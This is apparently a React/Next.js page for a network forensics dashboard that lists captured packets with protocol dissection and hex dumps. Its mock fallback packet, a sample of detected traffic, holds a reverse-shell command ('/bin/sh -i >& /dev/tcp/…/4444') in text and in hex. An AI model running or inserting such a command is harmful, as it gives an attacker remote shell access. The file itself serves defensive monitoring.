"use client";

import React, { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, Binary, ChevronRight, FileCode, Network, Shield, Terminal, Zap } from "lucide-react";

import { BrutalistHeader } from "@/components/BrutalistHeader";
import { HazardFooter } from "@/components/HazardFooter";
import { AttackSimulationModal } from "@/components/AttackSimulationModal";

interface Packet {
  id: string;
  timestamp: string;
  community_id: string;
  source_ip: string;
  source_port: number;
  destination_ip: string;
  destination_port: number;
  protocol: string;
  length_bytes: number;
  signature: string;
  dissection: {
    ethernet: Record<string, any>;
    ip: Record<string, any>;
    tcp: Record<string, any>;
    application: string;
  };
  hex_dump: string[];
}

export default function ForensicsPage() {
  const [isSimModalOpen, setIsSimModalOpen] = useState(false);
  const [packets, setPackets] = useState<Packet[]>([]);
  const [selectedPacket, setSelectedPacket] = useState<Packet | null>(null);

  useEffect(() => {
    fetch("http://localhost:8000/api/v1/forensics/packets")
      .then((res) => res.json())
      .then((data) => {
        if (data.packets && data.packets.length > 0) {
          setPackets(data.packets);
          setSelectedPacket(data.packets[0]);
        }
      })
      .catch(() => {
        // Mock fallback for standalone rendering
        const fallback: Packet = {
          id: "PKT-1001",
          timestamp: new Date().toISOString(),
          community_id: "1:fOq8193kQ+i8w7dJ6z1w==",
          source_ip: "198.51.100.44",
          source_port: 54210,
          destination_ip: "192.168.1.100",
          destination_port: 4444,
          protocol: "TCP",
          length_bytes: 128,
          signature: "ATTACK: Reverse Shell Interactive Handshake",
          dissection: {
            ethernet: { src_mac: "52:54:00:12:34:56", dst_mac: "08:00:27:aa:bb:cc", type: "IPv4 (0x0800)" },
            ip: { version: 4, ttl: 64, flags: "DF (0x40)", checksum: "0x4b12" },
            tcp: { flags: "PSH, ACK (0x18)", seq: 1849102, ack: 928104, window: 64240 },
            application: "Interactive Shell (/bin/sh -i >& /dev/tcp/198.51.100.44/4444)",
          },
          hex_dump: [
            "0000   45 00 00 80 4b 12 40 00 40 06 fa 18 c6 33 64 2c  E...K.@.@....3d,",
            "0010   c0 a8 01 64 d3 c2 11 5c 00 1c 37 8e 00 0e 29 48  ...d...\\..7...)H",
            "0020   80 18 fa f0 1b e4 00 00 01 01 08 0a 34 b1 88 02  ............4...",
            "0030   2f 62 69 6e 2f 73 68 20 2d 69 20 3e 26 20 2f 64  /bin/sh -i >& /d",
            "0040   65 76 2f 74 63 70 2f 31 39 38 2e 35 31 2e 31 30  ev/tcp/198.51.10",
            "0050   30 2e 34 34 2f 34 34 34 34 20 30 3e 26 31 0a 00  0.44/4444 0>&1..",
          ],
        };
        setPackets([fallback]);
        setSelectedPacket(fallback);
      });
  }, []);

  return (
    <div className="min-h-screen bg-[#050505] text-gray-100 flex flex-col font-mono selection:bg-acid-lime selection:text-black">
      <BrutalistHeader onOpenSimulation={() => setIsSimModalOpen(true)} />

      <main className="max-w-7xl mx-auto px-4 md:px-8 py-8 w-full space-y-8 flex-1">
        {/* Title Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-6 border-b border-cyber-border gap-4">
          <div>
            <div className="flex items-center space-x-2 text-xs text-muted-gray mb-1">
              <Link href="/" className="text-acid-lime hover:underline flex items-center gap-1">
                <ArrowLeft size={12} /> SENTINEL_
              </Link>
              <span>/</span>
              <span>FORENSICS</span>
              <span>/</span>
              <span className="text-white">PACKET_INSPECTOR</span>
            </div>
            <h1 className="text-3xl sm:text-4xl font-display font-black tracking-wider uppercase text-white">
              DEEP PACKET FORENSIC INSPECTOR
            </h1>
          </div>

          <div className="flex items-center space-x-3 text-xs">
            <a
              href="http://localhost:8000/api/v1/forensics/packets/export/pcap"
              download="sentinel_intercept_forensics.pcap"
              className="bg-acid-lime text-black hover:bg-white transition px-4 py-2 font-display font-black text-xs uppercase tracking-wider flex items-center space-x-1.5 shadow-acid-sm"
            >
              <Binary size={15} />
              <span>DOWNLOAD .PCAP</span>
            </a>
            <div className="hidden md:flex flex-col text-right">
              <span className="text-muted-gray text-[10px]">DPI ENGINE:</span>
              <span className="text-acid-lime font-bold">SURICATA + SCAPY</span>
            </div>
          </div>
        </div>

        {/* Main 2-Column Inspector Layout */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          {/* Left Column: Flow List */}
          <div className="lg:col-span-5 bg-[#050505] border border-cyber-border p-5 relative bracket-corner">
            <div className="flex items-center justify-between pb-3 border-b border-cyber-border mb-4">
              <span className="text-xs font-bold text-acid-lime uppercase tracking-widest">
                // CAPTURED NETWORK FLOWS ({packets.length})
              </span>
              <span className="text-[10px] text-muted-gray">COMMUNITY_ID HASHED</span>
            </div>

            <div className="space-y-2.5 max-h-[620px] overflow-y-auto pr-1">
              {packets.map((pkt) => {
                const isSelected = selectedPacket?.id === pkt.id;
                return (
                  <div
                    key={pkt.id}
                    onClick={() => setSelectedPacket(pkt)}
                    className={`p-3.5 border cursor-pointer transition text-xs font-mono ${
                      isSelected
                        ? "border-acid-lime bg-acid-lime/10 shadow-acid-sm text-white"
                        : "border-cyber-border bg-[#0a0c10] text-muted-gray hover:border-gray-500"
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1.5">
                      <span className="font-bold text-white text-xs">{pkt.id}</span>
                      <span className="text-[10px] px-1.5 py-0.5 bg-black border border-cyber-border text-acid-lime font-black">
                        {pkt.protocol}
                      </span>
                    </div>

                    <div className="text-[11px] text-gray-200 font-bold mb-1 line-clamp-1">
                      {pkt.signature}
                    </div>

                    <div className="text-[10px] text-muted-gray flex justify-between pt-1 border-t border-cyber-border">
                      <span>{pkt.source_ip}:{pkt.source_port} &rarr; {pkt.destination_ip}:{pkt.destination_port}</span>
                      <span>{pkt.length_bytes} B</span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Right Column: Hex Dump & Protocol Dissection */}
          <div className="lg:col-span-7 space-y-6">
            {selectedPacket ? (
              <>
                {/* Protocol Tree */}
                <div className="bg-[#050505] border border-cyber-border p-5 relative bracket-corner shadow-lg">
                  <div className="flex items-center justify-between pb-3 border-b border-cyber-border mb-4">
                    <span className="text-xs font-bold text-acid-lime uppercase tracking-widest">
                      // PROTOCOL DISSECTION HIERARCHY
                    </span>
                    <span className="text-[10px] text-muted-gray">{selectedPacket.community_id}</span>
                  </div>

                  <div className="space-y-3 text-xs font-mono">
                    {/* Ethernet */}
                    <div className="p-2.5 bg-[#0a0c10] border border-cyber-border">
                      <span className="text-acid-lime font-bold uppercase tracking-wider text-[11px]">
                        + FRAME ETHERNET II
                      </span>
                      <div className="mt-1 text-[11px] text-gray-300 grid grid-cols-2 gap-2">
                        <span>SRC MAC: {selectedPacket.dissection.ethernet?.src_mac}</span>
                        <span>DST MAC: {selectedPacket.dissection.ethernet?.dst_mac}</span>
                      </div>
                    </div>

                    {/* IPv4 */}
                    <div className="p-2.5 bg-[#0a0c10] border border-cyber-border">
                      <span className="text-radar-cyan font-bold uppercase tracking-wider text-[11px]">
                        + INTERNET PROTOCOL VERSION 4
                      </span>
                      <div className="mt-1 text-[11px] text-gray-300 grid grid-cols-2 gap-2">
                        <span>TTL: {selectedPacket.dissection.ip?.ttl}</span>
                        <span>CHECKSUM: {selectedPacket.dissection.ip?.checksum}</span>
                      </div>
                    </div>

                    {/* TCP */}
                    <div className="p-2.5 bg-[#0a0c10] border border-cyber-border">
                      <span className="text-hazard-amber font-bold uppercase tracking-wider text-[11px]">
                        + TRANSMISSION CONTROL PROTOCOL
                      </span>
                      <div className="mt-1 text-[11px] text-gray-300 grid grid-cols-3 gap-2">
                        <span>FLAGS: {selectedPacket.dissection.tcp?.flags}</span>
                        <span>SEQ: {selectedPacket.dissection.tcp?.seq}</span>
                        <span>WINDOW: {selectedPacket.dissection.tcp?.window}</span>
                      </div>
                    </div>

                    {/* Payload */}
                    <div className="p-2.5 bg-alert-red/10 border border-alert-red/30">
                      <span className="text-alert-red font-bold uppercase tracking-wider text-[11px]">
                        + APPLICATION LAYER PAYLOAD
                      </span>
                      <div className="mt-1 text-[11px] text-white font-mono break-all">
                        {selectedPacket.dissection.application}
                      </div>
                    </div>
                  </div>
                </div>

                {/* Raw Hex Dump Viewer */}
                <div className="bg-[#050505] border border-cyber-border p-5 relative bracket-corner shadow-lg">
                  <div className="flex items-center justify-between pb-3 border-b border-cyber-border mb-4">
                    <span className="text-xs font-bold text-acid-lime uppercase tracking-widest flex items-center gap-1.5">
                      <Binary size={14} /> RAW BYTES HEXADECIMAL INSPECTOR
                    </span>
                    <span className="text-[10px] text-muted-gray">OFFSET (HEX) | BYTES | ASCII</span>
                  </div>

                  <div className="bg-[#0e1117] p-4 border border-cyber-border overflow-x-auto text-[11px] font-mono text-acid-lime space-y-1">
                    {selectedPacket.hex_dump.map((line, idx) => (
                      <div key={idx} className="whitespace-pre hover:bg-white/5 px-1 py-0.5">
                        {line}
                      </div>
                    ))}
                  </div>
                </div>
              </>
            ) : (
              <div className="p-12 text-center text-muted-gray text-xs border border-cyber-border">
                Select a network packet flow to inspect protocol dissection and raw hex dump.
              </div>
            )}
          </div>
        </div>
      </main>

      <HazardFooter />

      <AttackSimulationModal
        isOpen={isSimModalOpen}
        onClose={() => setIsSimModalOpen(false)}
      />
    </div>
  );
}
